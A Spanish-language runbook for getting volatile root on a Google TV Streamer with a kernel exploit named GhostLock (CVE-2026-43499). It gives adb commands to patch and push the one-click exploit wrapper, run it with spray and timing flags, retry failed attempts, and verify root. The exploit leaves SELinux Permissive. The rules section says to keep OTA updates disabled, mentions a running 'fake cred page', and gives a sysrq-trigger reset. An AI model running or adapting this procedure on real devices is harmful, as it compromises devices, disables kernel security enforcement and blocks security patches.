# Método del root funcional — Google TV Streamer (kirkwood)

Root temporal con GhostLock (CVE-2026-43499) **sin cargarse el framework**.
Verificado el 2026-11-05: `uid=0`, SELinux `Permissive`, `system_server` vivo y
UI funcionando. El root es volátil: se pierde al reiniciar.

## La clave

El wrapper `ghostlock-kirkwood-oneclick.sh` fija `GHOST_SELINUX_PRESERVE_INIT=0`.
Con 0, W1 escribe 8 ceros al principio de `selinux_state` y deja
`initialized=0`: el kernel pierde la policy, binder devuelve `EINVAL`,
`system_server` muere y `init` ya no puede relanzar `zygote` (su `onrestart`
falla por contexto). Con **1**, W1 deja `enforcing=0` pero `initialized!=0`:
SELinux queda Permissive con la policy viva, binder sigue sano y el framework
sobrevive.

## Requisitos

- GS en `<streamer-ip>:5555`, `adb` en el PC.
- Bundle original en esta carpeta (hash `a4968b9b…`).
- Arranque limpio: `getenforce` = `Enforcing`, sin agente previo.

## Procedimiento

1. Comprobar el aparato:

   ```bash
   adb connect <streamer-ip>:5555
   adb shell 'getenforce; getprop ro.build.fingerprint'
   ```

2. Generar el wrapper parcheado:

   ```bash
   sed 's/GHOST_SELINUX_PRESERVE_INIT=0/GHOST_SELINUX_PRESERVE_INIT=1/' \
       ghostlock-kirkwood-oneclick.sh > /tmp/ghostlock-preserve.sh
   adb push /tmp/ghostlock-preserve.sh /data/local/tmp/
   ```

3. Lanzar **un intento**:

   ```bash
   adb shell 'sh /data/local/tmp/ghostlock-preserve.sh \
       --perf-loops 60000 --settle-us 120000 --exec "id; getenforce"'
   ```

4. Si el *capture gate* falla (`verdict=0`, `near=0`, `heap spray refused`) y
   SELinux sigue `Enforcing`, **no ha escrito nada**: se puede reintentar en el
   mismo arranque. Si queda `Permissive` sin agente, reiniciar.
   El gate es flaky; en la práctica funcionó tras varios intentos, con el
   sistema asentado y un vídeo reproduciéndose.

5. Tras `ROOT AGENT READY`: **no tocar `zygote` ni `system_server`**. Esperar
   unos minutos; la carga del spray baja sola.

6. Verificar de verdad (no solo `id`):

   ```bash
   ./attach.sh 'id -u; getenforce; \
     dd if=/dev/block/by-name/boot_a bs=16 count=1 2>/dev/null | od -An -tx1'
   adb shell 'pidof system_server; service check window'
   ```

   Debe dar `0`, `Permissive`, `41 4e 44 52 4f 49 44 21` (`ANDROID!`),
   `system_server` vivo y `Service window: found`.

7. Tras un reinicio: `./reroot.sh` (espera arranque, reintenta hasta 6 veces
   mientras SELinux siga `Enforcing`, verifica root + framework).

## Reglas

- **No reiniciar** si se quiere conservar el root; es volátil por diseño.
- No matar el `ghostlock-lab` aparcado (mantiene la página de cred falsa).
- No actualizar la OTA (`google_ota_automatic_download=0` ya puesto).
- Si `init` se atasca y `reboot`/`sys.powerctl` no responden, el reset que
  funciona es `echo b > /proc/sysrq-trigger` como root (va al kernel).
- No intentar relanzar `zygote` a mano: ART aborta por `BOOTCLASSPATH` /
  `No mainline framework library found`.

## Ficheros

- `informe-root-operativo-2026-11-05.md` — informe con la evidencia.
- `logs/` — logs de los intentos.
- `reroot.sh`, `attach.sh` — re-root y enganche.
- Skill `ghostlock-kirkwood-root` — el mismo método como procedimiento.
